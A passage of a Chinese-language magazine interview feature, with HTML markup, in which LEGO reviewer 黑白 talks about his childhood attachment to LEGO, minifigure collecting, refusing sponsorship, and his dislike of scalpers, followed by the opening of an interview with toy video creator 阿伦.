看到高达模型给我带来的一些改变之后，他们非但没有反对，甚至还尝试过去了解它。令我印象比较深的一次，是我妈有一天突然问我：「你那些模型都那么贵啊？」我才知道她在外面偶然间看到了一台高达模型，向同行的人问了一句价格。甚至在我奶奶来广州要住在家里的时候，我爸妈还会让我稍微收拾一下，免得我奶奶看到会唠叨。</p>\n<p>因此，我并没有遇到太多不理解的声音。随着 2020 年的高达中国计划让更多人认识到机动战士高达这个 IP，希望在今后的日子里，这样的偏见与不理解能够越来越少。</p>\n<h2>第二章：儿时的乐高情怀</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/9555fb8c55667caa8371f4d4561070e8.png\"></figure><blockquote><p><strong>Q：首先非常高兴您能接受少数派的采访，请您先跟少数派的读者朋友们打个招呼吧。</strong></p></blockquote>\n<p>A：好的，大家好，我是黑白，是一名乐高玩家。我做乐高的视频，还有图文评测已经有十年之久了。最开始的时候是在贴吧，是去做一些图文评测，然后分享一些乐高的情报。后来就想着去以视频的形式去记录自己玩乐高的过程，主要的目的就是为了分享。</p>\n<blockquote><p><strong>Q：我们也有留意到您其实很早就开始有在优酷上传视频，16 年的时候也在 B 站开始发布视频了。您可以分享一些自己为什么会把乐高套装做成视频来分享吗？</strong></p></blockquote>\n<p>A：因为我算是很早的时候就玩乐高了，我是 80 后，在 92 年左右的时候应该是第一次接触乐高。所以我从小就会有比较强的一个乐高情结，因为小时候玩乐高是我特别喜欢的一件事情。08 年左右，然后出国上学，就渐渐地把小时候这个爱好给拾起来了。</p>\n<p>在做视频之前，其实开始分享这件事情是一个特别偶然的机会，那时候就是开始自己玩嘛，然后发现了百度一个叫 LEGO 吧的地方。当时去看到的一些帖子和各种分享，然后我就想，哎？那我自己是不是也可以去做一做，接着就渐渐地开始去做。先是写图文的一些评测，后来在做视频之前也涉及到了一些，就是做这种微信公众号，然后直到后来开始做视频的契机是因为看到国内根本没有人去做这个视频的评测。</p>\n<p>我自己是乐高迷，我去掌握乐高的咨询，其实我大多时候都是看国外的视频，然后那时候最早去做视频的时候，是因为有一个博主，他的名字叫 <a href=\"https://www.youtube.com/channel/UChIu8HiTCpvwzjOhrBOxUhA\">BrickShow</a>。（我看）他们去分享乐高的这个产品，然后做成 review 的这种视频，我觉得特别好，然后当时国内特别缺乏，我的印象里就是没有，我是第一个去做这件事情的人。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/d6be7e07f8b726988ad7315ec4679851.png\"></figure><p>然后就尝试着去做一些别人没做过的事情，直到分享到今天，就变成了一种习惯。</p>\n<p>去做视频的另外一个主要原因，也是因为我买的乐高的东西太多了，无论是图文还是视频的话，我认为是对于自己收藏的一种记录。到目前为止，我自己的记录应该有 <strong>1700 多套乐高</strong>，但是我不可能把他们都展示起来，我只会留我最喜欢的一些摆在家里面。</p>\n<p>所以做视频对于我而言，也是<strong>对于我喜欢的乐高的一种记录</strong>吧。</p>\n<blockquote><p>Q：的确，乐高买多了之后确实只会留下自己最喜欢的套装，其他的大多还是拆掉了。</p></blockquote>\n<p>是的，但是让我自己比较骄傲的一点，就是我从来没有去作为一个卖家的身份去处理掉自己的乐高。我这 1700 套乐高其实在我家里都是有的，只不过被装到箱子里面，然后零件单分，人仔单分这个样子。</p>\n<blockquote><p><strong>Q：您刚刚也提到，自己其实算是从小就开始玩乐高的老玩家了。那么想问问您还记得自己最开始接触乐高的情形吗？或者您开始入坑乐高的契机又是什么呢？</strong></p></blockquote>\n<p>A：我入坑的时候就是真的非常小，然后当时是因为我大姨之前在美国，92 年的时候她已经长期生活在美国了，然后她当时从美国带来这个乐高给我。在此之前就是家里有去买那些启蒙型玩具，其实早在 90 年代初的时候就会有国产积木，但是接触到乐高以后就觉得真的很喜欢。至今我还记得<strong>我第一个乐高就是一个骑士的人仔</strong>。</p>\n<p>我当时喜欢乐高可能就是出于男孩子喜欢的这种小人打仗，去摆设自己的战场。无论是像城堡系列、海盗系列，我就会特别喜欢，当然也会涉及到去拼一些小房子、城市之类的。</p>\n<p>但是其实早在 90 年代初，乐高就极贵无比。像当时 95 年左右的乐高一套大件也得有 1000 多块钱，就比较贵。所以家里也不可能会经常去买。但是我父母其实对于我玩乐高这件事情，一直都很支持。所以我小时候，乐高基本就陪我度过了童年的一个时期吧。</p>\n<p>我很享受那种自己去拼搭，就是自己去<strong>安安静静做一件事情</strong>的这个过程。</p>\n<p>其实我在现实中也是一个比较喜欢分享的人，就像我小时候玩乐高我就会把朋友都叫到家里来，我们去拼一个城堡啊，或者说海盗系列的海港。然后男孩子嘛，就一波去当海盗，一波去当官兵，这样去打、玩玩人仔之类的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/99906b5031e9f7f7dbcb0882ae3dfd4a.jpeg\"><figcaption>乐高 70404 国王城堡（图 / Amazon）</figcaption></figure><p>所以我跟很多玩家最大的不同，我觉得可能是我接触乐高确实很早。而且这个东西在我小时候就是一个我特别特别喜欢的一个事物。我小时候有一个梦想，就是家里买不了那么多乐高给我嘛，然后我又都喜欢，我就梦想着我长大以后要是开一个乐高工厂该多好。我自己是有这个乐高情怀的，某种方面上说，这已经有点小信仰了。</p>\n<blockquote><p><strong>Q：看得出您对乐高确实有很深的情结，那么您可以分享一下对于您来说，乐高最吸引您的地方在哪嘛？除了您前面跳的自己安安静静拼搭的过程之外。</strong></p></blockquote>\n<p>A：乐高最吸引我的地方，首先是对于乐高的品质而言吧。其实在 90 年代初的时候国产积木就有很，但就是乐高的品质即使到现在都是独树一帜的这种。我很喜欢他们公司对于做产品的态度，他们有一句格言叫做「只有最好才是足够好」。</p>\n<p>而我自己是偏向于一个人仔玩家，从我小时候开始，我在购买乐高产品时最喜欢的就是人仔。我觉得乐高的成功和它的人仔是息息相关的，因为早期，其实在 90 年代的时候，乐高的砖块并没有像现在一样复杂，甚至他们公司还遭遇了低谷期。</p> <p>同时我也十分享受拼搭的过程。可能因为原生家庭的问题，我在很长的一段时间就比较内向的性格。虽然我很喜欢和大家一起分享东西，包括平时也喜欢招待大家来家里玩，但是在我自己比较安静的时候，或者说想去独处的时候，乐高算是一个可以让我放空的东西。我可以自己在一个房间里面，花很长的时间去慢慢的搭建。在这个过程之中，尽管是看着说明书去拼的，但是看着它从一个小零件，到变成一座城堡，或者一艘船的过程，在这个过程之中，你是可以收获这种喜悦、成就感的。</p>\n<p>我也会喜欢乐高的很多创意，当然这里要提一句，乐高最近几年的开发，尽管市场在方向上发展得特别好。但作为一个骨灰级玩家的话，我其实并不是喜欢它很多跨圈的行为，就是非常商业化。（乐高）做了太多模型，而少了一些可能偏向于有趣的、原创的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/3a3255272497a500107df72c53763597.jpeg\"><figcaption>乐高 10282 Adidas Originals Superstar（图 / Lego）</figcaption></figure><blockquote><p><strong>Q：深有同感。其实我自己也算是一个人仔控，有时在店里还会跟许多小朋友一起挤在 BAM 那儿拼人仔。我们也留意到您有做过人仔阅兵的视频，想问问人仔对于您来说最大的吸引力在哪呢？如果对于不了解乐高、乐高文化的朋友来说，您又会怎样表达自己的这个爱好呢？</strong></p></blockquote>\n<p>A：是不是和别的玩家不太一样啊（笑），一般都会去吹一波砖块的妙用。但对于我而言，可能人仔和能够安静去做一件事情会放在最前面。</p>\n<p>人仔对于我最大的魅力还是他设计的比较好吧。因为要想我入坑的 90 年代初的时候，乐高其实根本就没有 IP 合作的，最早的也是跟车厂这些合作。直到他 2000 年左右，他开才开始跟这种大的 IP 像星战、哈利波特进行合作。</p>\n<p>我当时接触的人仔都是像城堡、城市、海盗这些系列的人仔。就是一个小黄脸，然后一个小笑脸就可以代表一切，不像现在人仔那么复杂。但是它会有那种精致的小铠甲、小头盔、小帽子，这些东西，让一个男孩子嘛，就很喜欢，你会觉得他做的东西很精致，而且他人仔模具的那种精致程度，到现在去看都还是非常棒。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/97489c8ec28ca7eecd21b08fd1e0ec91.png\"><figcaption>乐高 1995 年皇家武士</figcaption></figure><p>放在现在去看的话，可能从随着 2000 年，乐高经历了公司差点倒闭的这个过程之后，渐渐的他们有一个非常出色的 CEO，带他们重新开始去注重做人仔这方面，去做自己的产品。然后我们可以看到比如超英，从最开始的蝙蝠侠，到漫威引入之后，这个宇宙就凸显的无限大了，现在有各种各样的人仔。</p>\n<p>这时候收集人仔过程的喜悦，就不光是我最开始喜欢的那些城堡和海盗的人仔了。而是你对于各个 IP 的喜欢，然后也是当做一种收藏。像是抽抽乐，我就特别特别喜欢，从他们第一季出的时候，我都是现场到店里去摸，然后自己去享受这个过程。</p>\n<p>所以到目前为止，我就是除了小金人我没有去买。因为我觉得那个东西就是随缘，它的价值就在那儿，没有必要花大价格去买，其他的基本上我都是齐的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/41c43fa43ca41a0a6dfe237ea3683c3e.png\"><figcaption>一箱抽抽乐里只有一个小金人（实际材质为电镀金色的塑料，图 / brickimedia.org）</figcaption></figure><p>对于不了解乐高和乐高文化的人而言，其实很长很长一段时间，在我分享的过程之中是比较痛苦的，因为现在这两年中国的乐高文化才稍微开始起步，依然算是一个比较小的圈子。</p>\n<p>在长久的时间里面，你都会受到别人的误解，倒也不能说排挤吧，但是<strong>会有很多人不理解</strong>。因为乐高的价格从小到大都是一直以来都很贵，别人就会觉得「哎，你都是成年人了，你为什么还要玩儿这个小人，你为什么还要去买这个儿童玩具？」他会用有色眼光去看你，我也遭受过这种歧视。</p>\n<p>但是，当现在有这么多人，越来越多地跨圈去关注到乐高，如果让我想去对他们介绍这个爱好的话，我依然觉得说你可以去安安静静地在这么一个嘈杂的社会、一个压力这么大的时代之中，你可以有一个时间和地点，用一套乐高去<strong>放空自己</strong>。</p>\n<p>乐高是一个特别好的，可以让你<strong>和自己独处</strong>的一个机会，<strong>是可以解压的</strong>。这是我对于想要了解乐高的成年玩家朋友去说的。</p>\n<p>那对于家长而言，我认为这个东西确实实会<strong>培养一些动手能力</strong>的，尽管我想有很多的朋友，他拼完以后就和我一样摆在那儿就不去重新再拼了。到那时在我自己小的时候，我还是会喜欢把套装拆散，然后自己去搭个什么东西的，这个确实是对孩子的动手能力有一定的帮助。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/c64b926922f626f645167d56ee510efd.jpeg\"><figcaption>提倡「拆散重拼」的三合一系列（图 / Lego）</figcaption></figure><blockquote><p><strong>Q：正好您也提到有很多人对您的不理解，那么您是怎么看待这些不理解的？自己又是怎么调节心态来应对的呢？</strong></p></blockquote>\n<p>A：早期去看待这件事情的时候，心里是<strong>十分不平衡</strong>的。其实 B 站很早的时候我就有去做，但是后来有一段时间就放弃了，原因也是遭受别人的评论说「多大了，还玩乐高」，然后又如何如何，我就会开始质疑自己做这件事情的意义何在。</p>\n<p>因为我做视频和分享到现在，坚持了这十年，我认为真的就是单纯用爱发电。我想在中国买得起乐高的大有人在，但就是没有人愿意花这么多的钱和时间去做这件事情。</p>\n<p>我是因为自己<strong>真正喜欢</strong>，所以我愿意投入这个时间。所以当我遭受一些批评和我认为不公平的一些评价，甚至是遭遇同行的一些敌意。他可能认为你这是一件赚钱的事，我心里是会觉得不舒服。我也迷茫过，觉得我干脆我就撒手，就不做了，我自己玩儿自己的。我也以后周末可以减少多少在这上投入的时间，生活那么美好，我为什么不去做别的事情，但说白了就是一个字儿，就是<strong>爱</strong>。</p>\n<p>另外呢，就是因为确实我的这帮粉丝对于我有很大的鼓励，乐高的圈子很小，然后我的这帮粉丝最让我感动的话是很多人从小学开始看，我现在可能都大学毕业了，就是陪他们度过了整个青春的一个时期，这些话对于我特别特别鼓励，也是目前我去做下去，分享下去唯一的原因。</p>\n<blockquote><p><strong>Q：国内近几年的乐高文化环境确实有开始起步的迹象了，不光是有很多乐高相关的培训机构，甚至连《乐高大师》也有引入国内，并且选手们的创意都非常好。您对这些现象有什么看法吗？</strong></p></blockquote>\n<p>A：乐高大师引入中国肯定是特别好的一个现象了，它其中其实很多选手，我们都交流过很久。比如像 <a href=\"https://weibo.com/tonytoy\">麻烦橙子</a>，我们玩贴吧的时候就认识，说明这个圈子真的很小（笑）。我也非常欣赏他们，当我去看到这些选手或者是线下，虽然我跟他们接触的并不是很多，因为我长期在国外，但是当我每次跟他们接触，然后去看到他们那些东西，我是打心底里欣赏他们的，我觉得是需要有一帮这样的玩家，渐渐地撑起这个圈子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/03426ef65f38b3d9e66abce6e8c2a815.jpeg\"><figcaption>乐高大师中国版（图 / 微博 @深圳卫视）</figcaption></figure><p>而至于乐高培训机构，我觉得这个可能是一个因地制宜的项目。在美国这边，虽然国外也有这种 Lego Education 什么的，但是其实这绝对不是一个主流。相对的每次我回国之后，我会看到很多这样的机构，因为中国家长愿意为孩子去花这个钱嘛，不想让他们把太多的时间放在游戏上了。乐高对他们而言可能是一个培养孩子的兴趣、对于机械结构的喜爱的方式，以后是不是能培养成「理工男」的一种选择。对这方面乐高的发展，我则是保持一个怀疑的态度（笑）。</p>\n<p>我可能会觉得商业化什么的，但是对于孩子而言，你说让家长去交点钱参加这种机构，顺便再买点乐高啊，倒是一个不错的借口（笑），这就是心里话。</p>\n<blockquote><p><strong>Q：可以感受到，您对乐高确实有非常深的喜爱，我们也能在您视频的评论里看到很多一直支持着您的朋友，相信他们在您做视频分享的路上会是不小的动力吧。</strong></p></blockquote>\n<p>A：是的，<strong>观众就是目前我去做乐高视频的唯一原因吧</strong>。但其实我觉得我自己也是为观众，怎么说呢，尽量的保持我的频道的针对性。既然我没把它当做生意去做，就尽量少接推广。就是去表达我的喜爱。然后我自己这人也挺倔强的，其实乐高官方的人，他们也有我的粉丝，然后也邀请我去参加这个认证媒体，但我还是婉拒了。</p>\n<p>原因也特别简单，就是我认为我买的东西都是我喜欢的，<strong>不做乐高认证媒体</strong>，那是因为我想站在玩家的这个角度去考虑问题。我会觉得你拿了人家的钱，就得给人办事，这个是合情合理的。但我更希望自己一直保持着一个玩家的身份去聊着这件事情，不忘初心。</p>\n<p>毕竟乐高是产品，它是有价格的，而且乐高价格这么贵。我会觉得自己买的，和拿别人的去做东西就不一样。测评这个东西本身就很主观，我认为所有测评都是主观的，但你要是不作为一个消费者去分享的话，我会觉得不够纯粹。</p>\n<p>当然我并不是认为就是以玩养玩这件事不好，我知道在圈内有很多人也在这么去做这个事儿，但是这个东西我看得多了，会觉得是一个平衡的事情。</p>\n<blockquote><p><strong>Q：我记得您在之前的视频里也有提到，自己拒绝了乐高认证媒体的邀请，而是希望跟大家像朋友一样分享自己的热爱。所以在您的视频里可以感受到，您对喜欢的套装是真的夸，对做得不好的产品也会很直接地表达。</strong></p></blockquote>\n<p>A：是哈，我还确实是，就是不想去拿人手短。其实，去年我有一个机会去参加了乐高 FAO 的一个发布会。我当时跟他们合作的时候就一个要求，就是要我自己上手去拼，因为只有我去拼了，我才可以去面对观众，介绍给我的观众。</p>\n<p>我买的每一个产品，其实多多少少都会有我入的理由。我就是很任性，我不会说这东西大家想看，比如说泰坦尼克，或者说那个马里奥那箱子就是大家想看我就去做。我觉得他做的不够好，不够优秀，或者说他夸大其词，我就不买，我买的套装都会有我自己想入的理由。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/e065047837fb6d086d4a6178772c5a54.png\"><figcaption>乐高 71395 马里奥 64 问号箱（图 / Lego）</figcaption></figure><p>所以我在夸它，在喷它的时候也毫无保留。</p>\n<blockquote><p><strong>Q：我能不能这样理解：您对于乐高及其文化更愿意作为一名纯粹的玩家去分享自己的热爱，而不希望把自己的热爱做成一门生意，去代表官方的态度宣传某件产品之类的。</strong></p></blockquote>\n<p>A：是的，因为当你去见到这个圈子里头很多人在去做这件事情，想把它当作生意的时候，作为爱好而言，我是其实有点儿接受不了的。因为我比大多数人接触乐高的时间都早嘛，那个时候，乐高陪我度过了最小时候比较艰难的时光，或者说在我比较难受的日子里头一直陪伴着我，这东西对于我而言就是一个很信仰的东西，包括我在美国再把它拾起来的时候，也是当时心理上就是<strong>需要去放空自己</strong>的时候。</p>\n<p>但说实话，这个过程真的是无比的艰难。因为你去国内的这个视频网站，基本上你光靠点击率呀，你光去看这个小圈子啊，其实做这件事情，就是付出和回报就不成正比，就是靠着精神力去维持。所以在做这件事情上而言，我觉得自己<strong>既任性又骄傲</strong>。</p>\n<blockquote><p><strong>Q：保持纯粹的热爱真的是一件很不容易的事情，在这么多年的图文分享、视频分享以来，相信你也收获了不少东西，比如像官方合作的机会之类的，那么您觉得玩乐高这么多年，它给您带来了什么呢？</strong></p></blockquote>\n<p>A：其实我并没有跟官方有太多的合作，去年那个他们 FAO 也是授权店去找的，但是乐高官方里面确实是会有我的粉丝。我是没收过他们一分钱的，一个产品我也没拿过。那么乐高对于我这么多年带来了什么呢？大多数而言是快乐，然后做视频则是一个记录。</p>\n<p>玩乐高分享这件事情。从某些方面，既然是已经上升到热爱，然后没有那么多利益的一个过程，那么你就可以把它当做是你来人生这一趟你存在的意义，或者说你<strong>存在的痕迹</strong>。</p>\n<p>对于我个人而言，（玩乐高）肯定还是快乐的，因为不管我做不做视频这件事情，玩儿乐高的这件事，我从来就没有放弃过。尽管在国内有一段时间，就是上初中、高中那段时间，那也是乐高最黑暗的一段时间啊，他们的产品不够好，但是我也是一直关注，直到现在已经成为一个习惯吧。</p>\n<p>可能 80 后是比较讲究情怀的，<strong>乐高对于我而言就是情怀</strong>。我的想法就是能坚持一天是一天，尽量一直把这份热爱坚持下去。</p>\n<blockquote><p><strong>Q：能坚持 10 年不停分享其实也是挺不容易的事情，也希望您将来能将这份热爱传递给更多喜欢乐高的朋友。我身边有些朋友就是看您的视频开始入坑乐高的，想问问您作为一名骨灰级玩家，有没有什么话想对这些新乐高的玩家们说的呢？</strong></p></blockquote>\n<p>A：对于新的玩家而言，我觉得当你开始特别特别着迷乐高的时候，你会有一个误区，就是你会疯狂地想去追绝版，我的建议就是尽量还是不要太去追求绝版，而是着眼当下的一些产品。</p>\n<p>好的东西是会不断再出的，除非你有这种特别特别喜欢的，有一个物件儿，你比如说指环王的黑塔、某些特定的主题。像我就去买了，我小时候童年怨念已久的 90 年代初的这个黑骑士城堡。你如果没有这种特别想要的产品的话，而是觉得当时大家说哪个特别好啊，跟风的话，真的没必要，因为它会一直出。</p>\n<p>不要去把乐高当做一个炫耀的工具。乐高是很贵，在玩具之中，就是好像有点儿小贵族的意思，但它也就是一个玩具。就算是街景的老三样又怎么样？他其实那个东西放到现今，也并不是什么让人觉得很惊艳的东西，真的没有必要去花那 1 万块钱去买，要有自己的一个判断能力。</p>\n<p>因为我们永远是玩家，你不要以黄牛的想法去买乐高就哈了（笑）。我希望乐高带给新玩家更多的是纯粹的快乐，这是我最期盼的东西。</p>\n<blockquote><p><strong>Q：正好您也提到了绝版这件事，我们其实也有看到不少人会选择投资乐高、追绝版等升值。想问问您作为玩家怎么看待这种现象？</strong></p></blockquote>\n<p>A：其实从成年人的角度，他们要是想以玩养玩，我并不说有太多的看法。但是<strong>作为玩家而言，我对于黄牛之流是非常反感的</strong>。</p>\n<p>无论是国内还是国外，<strong>我会非常非常讨厌拿乐高来去做投资</strong>，因为他们忘记了一个东西，就是你要是拿乐高要投资，你还得有一个仓库的储存的一个成本，对不对，就是这个东西不是应该要去被炒的，因为乐高每年他们都不知道乐高出了多少件东西，你像一年乐高各类产品都得有七八百件。</p>\n<p>所以作为一个玩家而言，其实我是比较鄙视的，但是我也不会去表达出来，因为这是他们个人的选择。而至于和玩家抢这些赠品的黄牛而言，包括我跟乐高官方内部的朋友聊天的话，我都会说，我真的真的非常非常厌恶他们。</p>\n<p>因为我去年在国内去六一的时候，然后有一个小赠品，是那个小黄鸭子的旋转木马，我就很想要。但是官店，就旗舰店里全是黄牛，作为一个玩家，你想获得这个赠品太难了。我觉得不应该是这样的，这些黄牛转手就拿到电商上去卖几百块钱，那么一个小赠品炒到四五百块钱，让我觉得就是恶心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/c44917fc4140ff883920843c3cc99e8d.jpeg\"><figcaption>乐高 2020 年儿童节赠品（图 / rebrickable.com）</figcaption></figure><blockquote><p><strong>Q：深有同感，我想到前段时间出的 Everyone is Awesome 的套装，在国内因为各种原因没能上架，淘宝也不给卖，当时就有人把它炒得很贵，作为玩家来说肯定也是不想看到这种情况的。（编注：至截稿日，乐高已在旗舰店及授权店上架 Everyone is Awesome 套装，但电商平台依然屏蔽了套装编号。）</strong></p></blockquote>\n<p>A：是的，这个套装其实是乐高一个很发放福利的套装。今年其实我会有想去归隐的一些新的原因，也是很多乐高的题材不大好聊。像这个彩虹人仔就是，我会认为对于有些套组的包容性，真的实在是不够，这是一个很好的立意的一个套装。</p>\n<p>很多就是批判他的人，可能都没有去看过人家乐高设计副总监的这个视频。他去讲自己为什么要去设计这个东西，他所遭受的这种作为少数群体的这个不公啊，然后怎么样啊，他并没有说让你去摇旗呐喊，每个人对彩虹的这种想法都不一样。但是我觉得这个世界不应该是那么仇视，那么敌对的一个世界。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/a6550407574aa7ef9942aa1762cd06d7.jpeg\"><figcaption>乐高 40516 Everyone Is Awesome（图 / Lego）</figcaption></figure><p>所以说到这儿，今年我萌生出那种不想做的想法，可能也是有些东西我看到以后就是还挺不舒服的。我还是一个挺在现实生活中挺富有正义感和嫉恶如仇的人吧。</p>\n<p>然后对于投机倒把的人，那没有办法对吧。这个确实是挺难办的一个现象，然后乐高其实他之后应该还会有一系列的应对机制，就我目前了解，可能会有一些重磅的东西要推出，但是对于他们而言是绝对机密，这里也就不去透露了，可能出来之后对于玩家而言是个好处。</p>\n<blockquote><p><strong>Q：在少数派也有很多对乐高感兴趣的朋友，您又有没有哪些「出于私心」想要推荐的套装呢？</strong></p></blockquote>\n<p>A：这些年出于私心的套装，那可能真正让我找回童年感觉的就是<strong>梭鱼湾</strong>吧。因为我小时候会有一个海盗船嘛，那是我童年的怨念，当时家里答应给我买了，但是在去买的时候，后来就下架找不到了，算是满足了一个童年的小愿望，然后我会觉得两种形态摆起来都很有气势。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/54b003c8ba2f7160509546d1eaed3a50.png\"><figcaption>乐高 21322 梭鱼湾（图 / Lego）</figcaption></figure><blockquote><p><strong>Q：最后也感谢您这么晚了还愿意接受少数派的采访。</strong></p></blockquote>\n<p>A：好的，辛苦了。也感谢少数派对于我的采访，我非常喜欢你们这个频道的名字「少数派」，我就宁愿自己去一直当那个少数派。</p>\n<h2>第三章：从屏幕走到现实</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/9a1a83fe0433c8138ebbd7024d1938bc.png\"></figure><blockquote><p><strong>Q：首先很高兴您能接受少数派的采访，请您先跟少数派的读者朋友们打个招呼吧。</strong></p></blockquote>\n<p>A：少数派的读者朋友们大家好，我是阿伦，是名 B 站模玩 UP 主。</p>\n<blockquote><p><strong>Q：我们有留意到您从 18 年开始就有在 B 站分享自己的玩具摄影作品，19 年初的时候您开始在 B 站上传视频。您可以分享一下自己为什么会开始在 B 站上传视频吗？</strong></p></blockquote>\n<p>A：这个有点说来话长。可能要从我工作讲起，我第一份工作是 16 年的时候，从事的行业是跟玩具有关，当时 4399 总部这边有个玩具部门，不过是做儿童玩具领域的。当时带我的负责人，在那个时候交我拍照啥的，我一开始应该是先从玩具照片分享开始，在微博跟 PLAY 上面。PLAY 一开始主要还是照片分享多一些，其实挺方便的，那会儿也认识了很多国内的拍胶大佬.</p>\n<p>后来有一阵子，玩具买的比较多了，加上工作的问题，开始有点顾不上。所以有时候玩具会是只打开看一眼，甚至没有拍照。然后我就感觉这样不太好，那时候就开始有了做视频分享的想法了。选择在 B 站发，当然是因为 B 站的氛围好啦（笑）。</p>\n<p>因为那时候感觉，做视频，应该会有有人催更吧（笑）。</p>\n<blockquote><p><strong>Q：现在却变成了「有时候，鸽也是种不鸽了吗」🌝。</strong></p></blockquote>\n<p>A：哈哈哈哈对，这句话其实是回应之前的时候，我那时候挺鸽的。但是我很爱讲一句话就是，我会跟群友说，我要鸽了。然后我就真的鸽了，然后其实某种意义来说，这就是一种不鸽嘛（笑）。</p>\n<blockquote><p><strong>Q：正好您也提到了之前的工作，您最近不是开始转型为全职 UP 主了嘛，想问问您为什么会做这样的决定，身份的转变对您来说又意味着什么吗？</strong></p></blockquote>\n<p>A：我在 B 站最近的一个置顶文章里有简单提了一下，其实就是，想试一试。因为我属于一个比较敢去尝试的人，家人对这方面也比较支持，一来是他们觉得我只要不做违法的事情，身体健康能照顾好自己就行了，所以我就没有关于家庭方面的担忧。另一个就是我从事的工作，一直是互联网自媒体这块相关的，我也是个管理者，感觉既然我能带项目，那不如试试看把自己账号弄一下，<strong>也算是追个梦想吧</strong>，在下决定之前我思考了蛮久的，因为确实是害怕说会有不好的情况，不过也感觉如果我不试一下，那再过几年我不一定会有这样的想法了，等以后万一后悔了呢？</p>\n<p>身份的转变其实对我来说，我是觉得挺好的。因为我马上也要结婚了，步入人生的下一个阶段，我比较喜欢锻炼自己，我不是很喜欢安安稳稳地做一份稳定的工作。我工作 5 年的时间，也是从最底层，最后走上了管理层这样。</p>\n<blockquote><p><strong>Q：话说回来，在你的视频中我们能看到你有入手非常多的模玩，相信观众也能感受到您对模玩的热爱，那么您可以分享一下自己是什么时候开始入坑模玩的吗？入坑的契机又是什么呢？</strong></p></blockquote>\n<p>A：其实就是从小接触玩具，<strong>更多的是因为我的父亲吧</strong>。我父亲是一位愿意给我买玩具的人，在我小的时候我就比同龄人的玩具要更多，而且接触的种类也多。当时像是奥特曼、战队、四驱车、悠悠球、数码宝贝、铁甲小宝、火车侠什么的，就是电视上热播什么我就有什么那种。</p>\n<p>不过真正意义上要说开始收藏，或者是正式一点的，应该就是十几年前读高中的时候。那时候《机动战士高达 SEED》在国内很火，身边有一些朋友有买高达，然后那会儿线下我们这有实体店，我就被喊过去看。</p>\n<p>看到那一柜子的盒子，还有一些拼装好的机体，甚至是当年非常流行的伪电镀的代工作品，一下子就让我心动了。不过学生时期钱肯定是没那么多的，就慢慢买，甚至是偷偷买，家里也没有说很支持，但是在不影响学习的情况下倒是没有反对。</p>\n<p>然后就一个月可能买一盒吧，或者几个月买个大一点的，一直持续下去，到了工作之后慢慢的自己经济独立了，闲钱多了，就自己赚钱自己买了。</p>\n<p>准确来说，我是真·全坑玩家，啥都有一点点的那种哈哈。但是我不承认我是大佬，因为我见过很多真大佬。</p>\n<p>我很喜欢买一些我没接触过的感兴趣的东西，我不会局限在一个类型的玩具上面，其实内容创作上也是的，创作相同的东西会让我觉得有些时候思绪会打不开。所以我也会去阅读大量的资料，片子什么的。我有一些朋友是知道的，我有时候可能为了视频里的一句话，或者是一个画面，我去研究个好几天。</p>\n<blockquote><p><strong>Q：那可不可以这么理解，对您来说，兴趣是让您喜欢玩模玩、收藏模玩的一大因素呢？</strong></p></blockquote>\n<p>A：嗯嗯，兴趣使然。当然肯定是要有兴趣的，不然自己也会累的。</p>\n<p>喜欢玩具我觉得应该就是男孩子的一个本性吧，我印象最深的一句话就是丈母娘来我家里的时候，看到我的玩具说「男娃娃就该玩这个」。</p>\n<p>喜欢玩一方面是因为这些大多数都是我们有共情的 IP，原先我们从只能在屏幕里看到，到能够把这个东西带到现实中来，这种感觉对我来说是很微妙的。特别是这些年玩具产业不断变强，越来越多优秀的作品出现这一点也让我们有更多的选择，像是你喜欢某一部作品的某一个角色的某一个瞬间或是某一个动作。</p>\n<p>或许你是可以通过玩具来把这个瞬间给带回家来的，当你在看到这些东西的时候，你就会回想起当时的状态。就是我很讲究「共情」哈哈哈。</p>\n<p>我很少买我不感兴趣的东西，或者几乎不会买，拍也差不多。但是我有需求的时候，需要研究某个东西的时候还是会去买。但是往往这个之后，他就变成是我感兴趣的了（笑）。</p>\n<blockquote><p><strong>Q：我们做文字内容的时候也有同感，多接收不一样的东西才能让自己的思维更开阔。</strong></p></blockquote>\n<p>A：对的，因为这一点上在玩具方面特别特别有感，是因为什么呢，一个产品或者说一套产品吧，我的理解下厂商肯定是要去最大化商业价值的。所以就会遇上所谓的「同模换色、同模改细节」等等，有些点那确实是你讲过一回了，下回再遇到这个情况，就感觉你说吧，感觉上次提到了，你不说吧，那如果别人没看过上次的视频怎么办呢。所以可以看到我频道每一整页下来，我都在不断拍各种各样的玩具。</p>\n<blockquote><p><strong>Q：从视频的呈现也能感受到您对视频创作的精雕细琢，那么您平时是怎样不断学习、调整自己的创作方法的呢？</strong></p></blockquote>\n<p>A：<strong>通过买买买</strong>（笑）。我本身是艺术生嘛，工业设计系的，所以说对一些东西，我会有自己的看法跟判断。我比较喜欢通过实物或者是书籍、访谈这些的，去了解到这些东西是什么样的，还有跟前辈们聊天取经啥的</p>\n<blockquote><p><strong>Q：对的，感觉每次看您的视频都能看到新鲜东西（印象比较深的还是无骨雕那期，太魔性了）。</strong></p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/4c7dfc8ba211d7f2ee8dad590f41f6d6.gif\"></figure> 